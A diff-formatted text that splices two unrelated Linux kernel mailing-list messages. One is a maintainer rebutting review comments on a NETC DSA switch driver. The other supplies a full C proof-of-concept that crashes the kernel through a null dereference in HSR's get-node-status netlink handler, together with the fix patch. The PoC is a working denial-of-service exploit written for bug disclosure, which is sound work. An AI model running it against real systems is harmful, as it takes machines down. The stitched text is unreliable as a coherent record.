-> > +static int netc_port_create_emdio_bus(struct netc_port *np,
-> > +				      struct device_node *node)
-> > +{
-> > +	struct netc_switch *priv =3D np->switch_priv;
-> > +	struct enetc_mdio_priv *mdio_priv;
-> > +	struct device *dev =3D priv->dev;
-> > +	struct enetc_hw *hw;
-> > +	struct mii_bus *bus;
-> > +	int err;
-> > +
-> > +	hw =3D enetc_hw_alloc(dev, np->iobase);
-> > +	if (IS_ERR(hw))
-> > +		return dev_err_probe(dev, PTR_ERR(hw),
-> > +				     "Failed to allocate enetc_hw\n");
-> > +
-> > +	bus =3D devm_mdiobus_alloc_size(dev, sizeof(*mdio_priv));
->=20
-> [ ... ]
->=20
-> > +	err =3D devm_of_mdiobus_register(dev, bus, node);
->=20
-> [ ... ]
->=20
-> > +static int netc_init_all_ports(struct netc_switch *priv)
-> > +{
-> > +	struct device *dev =3D priv->dev;
-> > +	struct netc_port *np;
-> > +	struct dsa_port *dp;
-> > +	int err;
-> > +
-> > +	priv->ports =3D devm_kcalloc(dev, priv->info->num_ports,
-> > +				   sizeof(struct netc_port *),
-> > +				   GFP_KERNEL);
->=20
-> [ ... ]
->=20
-> > +	for (int i =3D 0; i < priv->info->num_ports; i++) {
-> > +		np =3D devm_kzalloc(dev, sizeof(*np), GFP_KERNEL);
->=20
-> [ ... ]
->=20
-> > +static int netc_init_all_cbdrs(struct netc_switch *priv)
-> > +{
-> > +	struct netc_switch_regs *regs =3D &priv->regs;
-> > +	struct ntmp_user *ntmp =3D &priv->ntmp;
-> > +	int i, err;
-> > +
-> > +	ntmp->cbdr_num =3D NETC_CBDR_NUM;
-> > +	ntmp->dev =3D priv->dev;
-> > +	ntmp->ring =3D devm_kcalloc(ntmp->dev, ntmp->cbdr_num,
-> > +				  sizeof(struct netc_cbdr),
-> > +				  GFP_KERNEL);
->=20
-> [ ... ]
->=20
-> > +static int netc_setup(struct dsa_switch *ds)
-> > +{
-> > +	struct netc_switch *priv =3D ds->priv;
-> > +	struct dsa_port *dp;
-> > +	int err;
-> > +
-> > +	err =3D netc_init_switch_id(priv);
-> > +	if (err)
-> > +		return err;
-> > +
-> > +	err =3D netc_init_all_ports(priv);
-> > +	if (err)
-> > +		return err;
-> > +
-> > +	err =3D netc_init_ntmp_user(priv);
->=20
-> Can these devres-managed allocations and registrations cause issues when =
-the
-> DSA tree unbinds and rebounds?
->=20
-> In the DSA subsystem, the .setup callback is invoked when the conduit
-> interface becomes available. If the conduit interface is unbound and rebo=
-und,
-> the DSA tree goes through a teardown and setup cycle, meaning netc_setup(=
-)
-> can be called multiple times during the lifetime of the underlying PCI de=
-vice.
+Thanks for your attention to this bug. Here are some resources to help
+you trigger the bug.
 
-This analysis is wrong, the switch driver will be removed if the conduit in=
-terface
-is unbound. A device link is created between the switch and the conduit int=
-erface.
-See dsa_conduit_setup():
+Required key configs for the poc:
+```
+CONFIG_HSR=3Dy
+CONFIG_VETH=3Dy
+```
 
-if (!netif_is_lag_master(dev)) {
-		consumer_link =3D device_link_add(ds->dev, dev->dev.parent,
-						DL_FLAG_AUTOREMOVE_CONSUMER);
-		if (!consumer_link)
-			netdev_err(dev,
-				   "Failed to create a device link to DSA switch %s\n",
-				   dev_name(ds->dev));
+Here is a PoC trigger that causes the intended crash shown in the
+commit message:
+```c
+#include <arpa/inet.h>
+#include <linux/genetlink.h>
+#include <linux/if_ether.h>
+#include <linux/if_link.h>
+#include <linux/if_packet.h>
+#include <linux/netlink.h>
+#include <linux/rtnetlink.h>
+#include <linux/veth.h>
+#include <net/if.h>
+#include <stdio.h>
+#include <stdint.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/socket.h>
+#include <unistd.h>
+
+#define ETH_P_HSR        0x892F
+#define ETH_P_PRP        0x88FB
+#define HSR_TLV_ANNOUNCE 22
+
+enum { HSR_A_UNSPEC, HSR_A_NODE_ADDR, HSR_A_IFINDEX };
+enum { HSR_C_UNSPEC, HSR_C_RING_ERROR, HSR_C_NODE_DOWN,
+       HSR_C_GET_NODE_STATUS };
+
+static const uint8_t sup_mcast[6] =3D {0x01,0x15,0x4e,0x00,0x01,0x00};
+static const uint8_t src_mac[6]   =3D {0x02,0xaa,0xaa,0xaa,0xaa,0x01};
+static const uint8_t node_macA[6] =3D {0x02,0xbb,0xbb,0xbb,0xbb,0x01};
+
+static void die(const char *m) { perror(m); exit(1); }
+
+static struct nlattr *nla_put(struct nlmsghdr *n, int type,
+      const void *data, int len)
+{
+struct nlattr *a =3D (void *)n + NLMSG_ALIGN(n->nlmsg_len);
+a->nla_type =3D type;
+a->nla_len  =3D NLA_HDRLEN + len;
+if (len)
+memcpy((char *)a + NLA_HDRLEN, data, len);
+n->nlmsg_len =3D NLMSG_ALIGN(n->nlmsg_len) + NLA_ALIGN(a->nla_len);
+return a;
 }
 
-For NETC switch it does not support LAG, so the consumer_link is created
-when dsa_conduit_setup() is called. netc_setup() is called only once during
-the lifetime of the switch device. The call stack is show below.
-netc_switch_probe()
-	=84=80=80dsa_register_switch()
-		 =84=80=80 dsa_switch_probe()
-			   =84=80=80 dsa_tree_setup()
-				     =84=80=80 dsa_tree_setup_switches()
-						   =84=80=80 dsa_switch_setup()
+static struct nlattr *nla_nest(struct nlmsghdr *n, int type)
+{
+return nla_put(n, type, NULL, 0);
+}
 
-This is a false positive, please ignore it.
+static void nla_nest_end(struct nlmsghdr *n, struct nlattr *start)
+{
+start->nla_len =3D (char *)n + n->nlmsg_len - (char *)start;
+}
 
->=20
-> Because netc_init_all_ports() and netc_init_ntmp_user() use devres functi=
-ons
-> (devm_kzalloc(), devm_kcalloc(), and devm_of_mdiobus_register()) tied to =
-the
-> PCI device, their resources will not be freed when .teardown is called. W=
-hen
-> the tree binds again, netc_setup() will execute anew, leaking the previou=
-sly
-> allocated memory. Also, devm_of_mdiobus_register() will attempt to regist=
-er an
-> MDIO bus with an ID that is already in use by the previous unfreed
-> registration, potentially causing .setup to fail.
->=20
-> Would it be better to either move these allocations to probe(), or manage=
- them
-> without devm_ helpers and explicitly clean them up in .teardown()?
->=20
-> [ ... ]
->=20
-> > +static void netc_switch_shutdown(struct pci_dev *pdev)
-> > +{
-> > +	struct netc_switch *priv =3D pci_get_drvdata(pdev);
-> > +
-> > +	if (!priv)
-> > +		return;
-> > +
-> > +	dsa_switch_shutdown(priv->ds);
->=20
-> Does the hardware continue to perform DMA after this shutdown callback ru=
-ns?
->=20
-> The netc_switch_pci_init() function enables PCI bus mastering and sets up=
- a
-> 64-bit DMA mask, and netc_init_all_cbdrs() initializes the Control BD rin=
-gs.
-> However, dsa_switch_shutdown() only closes the logical network ports with=
-out
-> invoking the DSA teardown callback, meaning the hardware BD rings are nev=
-er
-> disabled.
->=20
-> Leaving the hardware rings active with bus mastering enabled during a sys=
-tem
-> reboot or a transition to a kexec/kdump kernel might allow the device to
-> continue performing DMA into memory that may have been reassigned,
-> potentially
-> leading to silent memory corruption or IOMMU faults. Should the shutdown
-> callback explicitly disable the rings or call pci_clear_master() here?
+static int rtnl_talk(int sk, struct nlmsghdr *n)
+{
+if (send(sk, n, n->nlmsg_len, 0) < 0)
+die("send(rtnl)");
 
-NETC switch is PCIe device, what I learned from pci_device_shutdown() is th=
-at
-it is unnecessary to call pci_clear_master() in netc_switch_shutdown().
+char buf[4096];
+int len =3D recv(sk, buf, sizeof(buf), 0);
+if (len < 0)
+die("recv(rtnl)");
 
-See the comment from pci_device_shutdown():
-    /*
-	 * If this is a kexec reboot, turn off Bus Master bit on the
-	 * device to tell it to not continue to do DMA. Don't touch
-	 * devices in D3cold or unknown states.
-	 * If it is not a kexec reboot, firmware will hit the PCI
-	 * devices with big hammer and stop their DMA any way.
-	 */
+struct nlmsghdr *h =3D (void *)buf;
+if (h->nlmsg_type =3D=3D NLMSG_ERROR) {
+struct nlmsgerr *e =3D NLMSG_DATA(h);
+if (e->error)
+fprintf(stderr, "rtnl: %s\n", strerror(-e->error));
+return e->error;
+}
+return 0;
+}
 
->=20
-> > +	pci_set_drvdata(pdev, NULL);
->=20
-> Could clearing the driver data here break subsequent unbind operations?
->=20
-> If a user manually unbinds the driver via sysfs shortly after a shutdown
-> event, netc_switch_remove() will read a NULL priv pointer and return earl=
-y,
+static int rtnl_open(void)
+{
+int sk =3D socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
+if (sk < 0) die("socket(rtnl)");
+struct sockaddr_nl sa =3D { .nl_family =3D AF_NETLINK };
+if (bind(sk, (struct sockaddr *)&sa, sizeof(sa)) < 0)
+die("bind(rtnl)");
+return sk;
+}
 
-I believe this is a technically possible but meaningless edge case, and the=
-re
-is no need to make any changes to this meaningless situation.
+static int rtnl_seq;
 
-> skipping dsa_unregister_switch() and leaking the DSA state. Is it necessa=
-ry to
-> clear the driver data in the shutdown path?
-> > +}
+static void newlink_begin(struct nlmsghdr *n, const char *ifname,
+  const char *kind, struct nlattr **linkinfo,
+  struct nlattr **infodata)
+{
+struct ifinfomsg *ifm;
+n->nlmsg_len   =3D NLMSG_LENGTH(sizeof(*ifm));
+n->nlmsg_type  =3D RTM_NEWLINK;
+n->nlmsg_flags =3D NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE | NLM_F_EXCL;
+n->nlmsg_seq   =3D ++rtnl_seq;
+ifm =3D NLMSG_DATA(n);
+memset(ifm, 0, sizeof(*ifm));
+ifm->ifi_family =3D AF_UNSPEC;
 
+nla_put(n, IFLA_IFNAME, ifname, strlen(ifname) + 1);
+*linkinfo =3D nla_nest(n, IFLA_LINKINFO);
+nla_put(n, IFLA_INFO_KIND, kind, strlen(kind) + 1);
+*infodata =3D nla_nest(n, IFLA_INFO_DATA);
+}
 
+static void create_veth(int sk, const char *name, const char *peer)
+{
+char buf[1024] =3D {0};
+struct nlmsghdr *n =3D (void *)buf;
+struct nlattr *linkinfo, *infodata;
+
+newlink_begin(n, name, "veth", &linkinfo, &infodata);
+
+struct nlattr *peer_nest =3D nla_nest(n, VETH_INFO_PEER);
+struct ifinfomsg *p =3D (void *)n + NLMSG_ALIGN(n->nlmsg_len);
+memset(p, 0, sizeof(*p));
+n->nlmsg_len =3D NLMSG_ALIGN(n->nlmsg_len) + NLMSG_ALIGN(sizeof(*p));
+nla_put(n, IFLA_IFNAME, peer, strlen(peer) + 1);
+nla_nest_end(n, peer_nest);
+
+nla_nest_end(n, infodata);
+nla_nest_end(n, linkinfo);
+
+if (rtnl_talk(sk, n))
+exit(1);
+}
+
+static void link_up(int sk, const char *name)
+{
+char buf[256] =3D {0};
+struct nlmsghdr *n  =3D (void *)buf;
+struct ifinfomsg *ifm;
+n->nlmsg_len   =3D NLMSG_LENGTH(sizeof(*ifm));
+n->nlmsg_type  =3D RTM_NEWLINK;
+n->nlmsg_flags =3D NLM_F_REQUEST | NLM_F_ACK;
+n->nlmsg_seq   =3D ++rtnl_seq;
+ifm =3D NLMSG_DATA(n);
+memset(ifm, 0, sizeof(*ifm));
+ifm->ifi_family =3D AF_UNSPEC;
+ifm->ifi_index  =3D if_nametoindex(name);
+ifm->ifi_change =3D IFF_UP;
+ifm->ifi_flags  =3D IFF_UP;
+rtnl_talk(sk, n);
+}
+
+static void link_del(int sk, const char *name)
+{
+char buf[256] =3D {0};
+struct nlmsghdr *n  =3D (void *)buf;
+struct ifinfomsg *ifm;
+n->nlmsg_len   =3D NLMSG_LENGTH(sizeof(*ifm));
+n->nlmsg_type  =3D RTM_DELLINK;
+n->nlmsg_flags =3D NLM_F_REQUEST | NLM_F_ACK;
+n->nlmsg_seq   =3D ++rtnl_seq;
+ifm =3D NLMSG_DATA(n);
+memset(ifm, 0, sizeof(*ifm));
+ifm->ifi_family =3D AF_UNSPEC;
+ifm->ifi_index  =3D if_nametoindex(name);
+rtnl_talk(sk, n);
+}
+
+static void create_hsr(int sk, const char *name, int slave1, int slave2)
+{
+char buf[1024] =3D {0};
+struct nlmsghdr *n =3D (void *)buf;
+struct nlattr *linkinfo, *infodata;
+
+newlink_begin(n, name, "hsr", &linkinfo, &infodata);
+nla_put(n, IFLA_HSR_SLAVE1, &slave1, sizeof(slave1));
+nla_put(n, IFLA_HSR_SLAVE2, &slave2, sizeof(slave2));
+uint8_t ver =3D 1;
+nla_put(n, IFLA_HSR_VERSION, &ver, 1);
+nla_nest_end(n, infodata);
+nla_nest_end(n, linkinfo);
+
+if (rtnl_talk(sk, n))
+exit(1);
+}
+
+static void send_sup_frame(const char *ifname)
+{
+struct __attribute__((packed)) {
+uint8_t  h_dest[6], h_source[6];
+uint16_t h_proto;
+uint16_t path_and_LSDU_size, sequence_nr, encap_proto;
+uint16_t path_and_HSR_ver, sup_sequence_nr;
+uint8_t  tlv_type, tlv_length;
+uint8_t  payload_macA[6];
+uint8_t  eot_type, eot_length;
+} f =3D {0};
+
+int s =3D socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
+if (s < 0) die("socket(AF_PACKET)");
+
+struct sockaddr_ll sll =3D {
+.sll_family   =3D AF_PACKET,
+.sll_protocol =3D htons(ETH_P_HSR),
+.sll_ifindex  =3D if_nametoindex(ifname),
+.sll_halen    =3D 6,
+};
+memcpy(sll.sll_addr, sup_mcast, 6);
+if (bind(s, (struct sockaddr *)&sll, sizeof(sll)) < 0)
+die("bind(AF_PACKET)");
+
+memcpy(f.h_dest, sup_mcast, 6);
+memcpy(f.h_source, src_mac, 6);
+f.h_proto            =3D htons(ETH_P_HSR);
+f.path_and_LSDU_size =3D htons((1 << 12) | 28);
+f.sequence_nr        =3D htons(1);
+f.encap_proto        =3D htons(ETH_P_PRP);
+f.sup_sequence_nr    =3D htons(1);
+f.tlv_type           =3D HSR_TLV_ANNOUNCE;
+f.tlv_length         =3D 6;
+memcpy(f.payload_macA, node_macA, 6);
+
+if (sendto(s, &f, sizeof(f), 0,
+   (struct sockaddr *)&sll, sizeof(sll)) < 0)
+die("sendto(sup)");
+close(s);
+}
+
+static int resolve_hsr_family(int sk)
+{
+char buf[1024] =3D {0};
+struct nlmsghdr *n  =3D (void *)buf;
+struct genlmsghdr *g;
+
+n->nlmsg_len   =3D NLMSG_LENGTH(sizeof(*g));
+n->nlmsg_type  =3D GENL_ID_CTRL;
+n->nlmsg_flags =3D NLM_F_REQUEST | NLM_F_ACK;
+g =3D NLMSG_DATA(n);
+g->cmd     =3D CTRL_CMD_GETFAMILY;
+g->version =3D 1;
+nla_put(n, CTRL_ATTR_FAMILY_NAME, "HSR", 4);
+
+if (send(sk, n, n->nlmsg_len, 0) < 0) die("send(genl)");
+int len =3D recv(sk, buf, sizeof(buf), 0);
+if (len < 0) die("recv(genl)");
+
+struct nlmsghdr *h  =3D (void *)buf;
+struct genlmsghdr *gh =3D NLMSG_DATA(h);
+int alen =3D h->nlmsg_len - NLMSG_LENGTH(sizeof(*gh));
+struct nlattr *a =3D (void *)gh + NLMSG_ALIGN(sizeof(*gh));
+while (alen > 0 && a->nla_len) {
+if (a->nla_type =3D=3D CTRL_ATTR_FAMILY_ID)
+return *(uint16_t *)((char *)a + NLA_HDRLEN);
+int step =3D NLA_ALIGN(a->nla_len);
+a =3D (void *)a + step;
+alen -=3D step;
+}
+fprintf(stderr, "HSR family not found\n");
+exit(1);
+}
+
+static void trigger(int sk, int family_id, int hsr_ifindex)
+{
+char buf[256] =3D {0};
+struct nlmsghdr *n  =3D (void *)buf;
+struct genlmsghdr *g;
+
+n->nlmsg_len   =3D NLMSG_LENGTH(sizeof(*g));
+n->nlmsg_type  =3D family_id;
+n->nlmsg_flags =3D NLM_F_REQUEST | NLM_F_ACK;
+g =3D NLMSG_DATA(n);
+g->cmd     =3D HSR_C_GET_NODE_STATUS;
+g->version =3D 1;
+nla_put(n, HSR_A_IFINDEX,   &hsr_ifindex, sizeof(hsr_ifindex));
+nla_put(n, HSR_A_NODE_ADDR, node_macA,    6);
+
+send(sk, n, n->nlmsg_len, 0);
+}
+
+int main(void)
+{
+int rsk =3D rtnl_open();
+
+create_veth(rsk, "v0", "v1");
+create_veth(rsk, "v2", "v3");
+link_up(rsk, "v0"); link_up(rsk, "v1");
+link_up(rsk, "v2"); link_up(rsk, "v3");
+
+create_hsr(rsk, "hsr0", if_nametoindex("v0"), if_nametoindex("v2"));
+link_up(rsk, "hsr0");
+
+int hsr_ifindex =3D if_nametoindex("hsr0");
+if (!hsr_ifindex) die("if_nametoindex(hsr0)");
+
+usleep(200 * 1000);              /* let carrier propagate */
+send_sup_frame("v1");            /* sets addr_B_port =3D SLAVE_A */
+usleep(200 * 1000);              /* let kernel process the frame */
+
+link_del(rsk, "v0");             /* slave_a port goes away */
+usleep(200 * 1000);              /* let RCU drain */
+
+int gsk =3D socket(AF_NETLINK, SOCK_RAW, NETLINK_GENERIC);
+if (gsk < 0) die("socket(genl)");
+
+int fid =3D resolve_hsr_family(gsk);
+trigger(gsk, fid, hsr_ifindex);  /* boom */
+
+puts("[*] survived -- bug did not trigger");
+return 0;
+}
+```
+
+Feel free to ask any questions.
+Thanks,
+Xiang
+
+On Mon, May 11, 2026 at 12:15=E2=80=AFAM Xiang Mei <xmei5@asu.edu> wrote:
+>
+> hsr_get_node_data() looks up a node's address-B port and dereferences
+> port->dev->ifindex without checking the return value of
+> hsr_port_get_hsr(), which returns NULL when no port of the requested
+> type is currently attached.
+>
+> node->addr_B_port is set by hsr_handle_sup_frame() on every supervision
+> frame but is never cleared when the corresponding slave is removed.
+> If one slave of an HSR master is unregistered while the master stays
+> alive (the other slave keeps it up), node_db entries retain a stale
+> addr_B_port. An unprivileged HSR_C_GET_NODE_STATUS query (genl op has
+> .flags =3D 0) then crashes the kernel:
+>
+>   Oops: general protection fault, probably for non-canonical address
+>   0xdffffc0000000002: 0000 [#1] SMP KASAN NOPTI
+>   KASAN: null-ptr-deref in range [0x0000000000000010-0x0000000000000017]
+>   RIP: 0010:hsr_get_node_data (net/hsr/hsr_framereg.c:892)
+>   Call Trace:
+>    hsr_get_node_status (net/hsr/hsr_netlink.c:366)
+>    genl_family_rcv_msg_doit (net/netlink/genetlink.c:1114)
+>    genl_rcv_msg (net/netlink/genetlink.c:1209)
+>    netlink_rcv_skb (net/netlink/af_netlink.c:2550)
+>    netlink_unicast (net/netlink/af_netlink.c:1344)
+>    netlink_sendmsg (net/netlink/af_netlink.c:1894)
+>    __sys_sendto (net/socket.c:2265)
+>
+> Default *addr_b_ifindex to -1 and only overwrite it when the port
+> lookup succeeds. The caller hsr_get_node_status() already treats
+> addr_b_ifindex =3D=3D -1 as "no address-B port" when emitting the
+> HSR_A_NODE_ADDR_B / HSR_A_ADDR_B_IFINDEX attributes, so behavior is
+> unchanged for valid setups.
+>
+> Fixes: c5a759117210 ("net/hsr: Use list_head (and rcu) instead of array f=
+or slave devices.")
+> Reported-by: Weiming Shi <bestswngs@gmail.com>
+> Assisted-by: Claude:claude-opus-4-7
+> Signed-off-by: Xiang Mei <xmei5@asu.edu>
+> ---
+>  net/hsr/hsr_framereg.c | 6 +++---
+>  1 file changed, 3 insertions(+), 3 deletions(-)
+>
+> diff --git a/net/hsr/hsr_framereg.c b/net/hsr/hsr_framereg.c
+> index d09875b33588..8018d5c0c878 100644
+> --- a/net/hsr/hsr_framereg.c
+> +++ b/net/hsr/hsr_framereg.c
+> @@ -887,11 +887,11 @@ int hsr_get_node_data(struct hsr_priv *hsr,
+>         if (hsr->prot_version !=3D PRP_V1)
+>                 fill_last_seq_nrs(node, if1_seq, if2_seq);
+>
+> +       *addr_b_ifindex =3D -1;
+>         if (node->addr_B_port !=3D HSR_PT_NONE) {
+>                 port =3D hsr_port_get_hsr(hsr, node->addr_B_port);
+> -               *addr_b_ifindex =3D port->dev->ifindex;
+> -       } else {
+> -               *addr_b_ifindex =3D -1;
+> +               if (port)
+> +                       *addr_b_ifindex =3D port->dev->ifindex;
+>         }
+>
+>         return 0;
+> --
+> 2.43.0
+>
 
